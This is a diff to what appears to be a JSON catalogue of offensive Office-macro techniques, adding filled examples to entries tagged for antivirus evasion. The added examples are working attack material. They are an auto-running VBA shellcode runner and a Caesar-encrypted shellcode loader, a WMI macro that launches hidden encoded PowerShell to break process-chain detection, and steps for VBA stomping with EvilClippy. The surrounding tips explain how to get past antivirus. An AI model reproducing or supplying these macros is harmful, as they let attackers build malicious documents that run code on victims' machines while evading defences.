@@ -5,7 +5,7 @@
     {
       "id": "vba-shellcode-runner-basic",
       "name": "VBA Shellcode Runner (Basic)",
-      "description": "Basic VBA macro for executing shellcode in memory. Uses VirtualAlloc → RtlMoveMemory → CreateThread pattern. Foundation for Office-based payloads.",
+      "description": "Basic VBA macro for executing shellcode in memory. Uses VirtualAlloc \u2192 RtlMoveMemory \u2192 CreateThread pattern. Foundation for Office-based payloads.",
       "category": "vba-evasion",
       "tags": [
         "anti-virus",
@@ -35,7 +35,8 @@
         "64-bit Office requires PtrSafe declarations - Use 'Private Declare PtrSafe'",
         "Shellcode doesn't execute - Verify architecture match (x86/x64)",
         "AV blocks VirtualAlloc with PAGE_EXECUTE_READWRITE - Add encryption"
-      ]
+      ],
+      "filled_example": "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr\n\nSub Auto_Open()\n    Dim buf As Variant\n    buf = Array(232, 130, 0, 0, 0, ...)\n    \n    Dim addr As LongPtr\n    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n    \n    Dim counter As Long\n    For counter = LBound(buf) To UBound(buf)\n        Dim data As Long\n        data = buf(counter)\n        RtlMoveMemory addr + counter, data, 1\n    Next counter\n    \n    Dim thandle As LongPtr\n    thandle = CreateThread(0, 0, addr, 0, 0, 0)\nEnd Sub"
     },
     {
       "id": "vba-caesar-cipher",
@@ -76,12 +77,13 @@
         "Modulo calculation error - Ensure proper wrapping (Mod 256)",
         "Decryption loop detected - Obfuscate variable names",
         "Still flagged - Caesar too weak, use XOR"
-      ]
+      ],
+      "filled_example": "' Offline encryption (Python):\n# shellcode = [0xfc, 0x48, 0x83, ...]\n# key = 2\n# encrypted = [(b + key) % 256 for b in shellcode]\n\n' VBA decryption and execution:\nSub AutoOpen()\n    Dim buf As Variant\n    buf = Array(254, 74, 133, ...)  ' Caesar encrypted shellcode\n    \n    ' Decrypt with Caesar cipher\n    For i = LBound(buf) To UBound(buf)\n        buf(i) = (buf(i) - 2) Mod 256\n    Next i\n    \n    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)\n    Dim addr As LongPtr\n    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n    For i = LBound(buf) To UBound(buf)\n        RtlMoveMemory addr + i, buf(i), 1\n    Next i\n    CreateThread 0, 0, addr, 0, 0, 0\nEnd Sub"
     },
     {
       "id": "vba-wmi-dechain",
       "name": "VBA WMI Process Dechaining",
-      "description": "Execute payload via WMI to break parent-child process chain. Office doc → WMI → powershell breaks typical macro detection. Payload runs outside Office sandbox.",
+      "description": "Execute payload via WMI to break parent-child process chain. Office doc \u2192 WMI \u2192 powershell breaks typical macro detection. Payload runs outside Office sandbox.",
       "category": "vba-evasion",
       "tags": [
         "anti-virus",
@@ -111,7 +113,8 @@
         "PowerShell execution policy - Use -ExecutionPolicy Bypass",
         "Network connection blocked - Ensure firewall allows outbound",
         "Base64 corruption - Use -w0 flag in base64 command"
-      ]
+      ],
+      "filled_example": "Sub AutoOpen()\n    Dim payload As String\n    payload = \"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\"\n    \n    Dim pid As Variant\n    GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create payload, Null, Null, pid\nEnd Sub"
     },
     {
       "id": "vba-string-obfuscation",
@@ -179,7 +182,8 @@
         "P-code corrupted - Test before stomping, stomp carefully",
         "Modern Office versions may fail - Works best on Office 2016 and earlier",
         "AV still detects behavior - Stomping only evades static analysis"
-      ]
+      ],
+      "filled_example": "# VBA stomping workflow:\n# 1. Create malicious VBA macro in Office document\n# 2. Save as .doc (legacy format required for stomping)\n# 3. Use EvilClippy to stomp VBA source:\nEvilClippy.exe -s payload.doc -o payload_stomped.doc\n\n# Manual method:\n# 1. Open .doc in hex editor\n# 2. Locate VBA source code section\n# 3. Replace with garbage/nulls while preserving p-code\n# 4. Save and test"
     },
     {
       "id": "vba-autoopen-variants",
